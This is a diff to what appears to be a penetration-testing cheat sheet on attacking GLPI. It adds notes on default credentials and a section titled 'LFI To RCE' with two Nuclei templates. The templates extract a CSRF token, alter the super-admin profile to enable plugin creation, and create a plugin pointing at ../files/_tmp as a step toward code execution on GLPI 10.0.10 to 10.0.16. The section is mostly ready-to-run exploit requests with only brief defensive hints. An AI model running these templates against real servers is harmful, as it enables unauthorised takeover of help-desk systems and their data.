@@ -53,6 +53,12 @@ GLPi version can be found in two places.
 
 <div class="row row-cols-lg-2"><div>
 
+#### GLPI Exploitation — Weak Credentials
+
+We may get a foothold if default credentials were not changed.
+
+🛡️ Use strong passwords and disable default accounts.
+
 #### GLPI Exploitation — .htaccess failure
 
 By default, `.htaccess` are ignored by Apache unless `AllowOverride` is specified. This can lead to multiple security issues.
@@ -64,7 +70,7 @@ By default, `.htaccess` are ignored by Apache unless `AllowOverride` is specifie
 
 #### GLPI Exploitation — PHP File Upload
 
-🤖 Tested with GLPI `10.0.10` to `10.0.16`.
+🤖 Tested with GLPI `10.0.10` to `10.0.16`. Access: `[Observer+]`.
 
 <details class="details-n">
 <summary>Allow PHP Extension In File Upload</summary>
@@ -176,5 +182,117 @@ http:
           - 200
 ```
 </details>
+
+🛡️ It seems in recent versions, they banned a few extensions.
 </div><div>
+
+#### GLPI Exploitation — LFI To RCE
+
+🤖 Tested with GLPI `10.0.10` to `10.0.16`. Access: `[Super Admin]`.
+
+<details class="details-n">
+<summary>Enable Plugin Creation</summary>
+
+```yaml!
+id: glpi-enable-plugin-creation
+
+info:
+  name: GLPI Enable Plugin Creation
+  author: anonymous
+  severity: info
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/front/profile.form.php"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <meta property="glpi:csrf_token" content="
+        name: csrf
+        internal: true
+
+    extractors:
+      - type: regex
+        internal: true
+        part: body
+        name: token
+        group: 1
+        regex:
+          - <meta\sproperty="glpi:csrf_token"\scontent="([[:alnum:]]{64})"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/front/profile.form.php"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    # Default is "3", to enabled plugins, we use "31"
+    # (enabled on id=4 which is super-admin)
+    body: "_config%5B31_0%5D=1&id=4&update=Save&_glpi_csrf_token={{token}}"
+
+    matchers:
+      - type: status
+        status:
+          - 302
+```
+</details>
+
+<details class="details-n">
+<summary>Create Plugin With Arbitrary PHP File</summary>
+
+```yaml!
+id: glpi-lfi-using-plugins
+
+info:
+  name: GLPI LFI using Plugins
+  author: anonymous
+  severity: info
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/front/profile.form.php"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - <meta property="glpi:csrf_token" content="
+
+    extractors:
+      - type: regex
+        internal: true
+        part: body
+        name: token
+        group: 1
+        regex:
+          - <meta\sproperty="glpi:csrf_token"\scontent="([[:alnum:]]{64})"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/ajax/kanban.php?action=add_item&itemtype=Plugin"
+
+    headers:
+      X-Glpi-Csrf-Token: "{{token}}"
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: "action=add_item&inputs=directory%3d../files/_tmp%26name%3dpwned%26version%3d1.0.0%26author%3dPwned"
+
+    extractors:
+      - type: dsl
+        dsl:
+          - status_code_2
+```
+</details>
+
+📚 Original article: [OCD Exploit](https://sensepost.com/blog/2024/from-a-glpi-patch-bypass-to-rce/)
 </div></div>
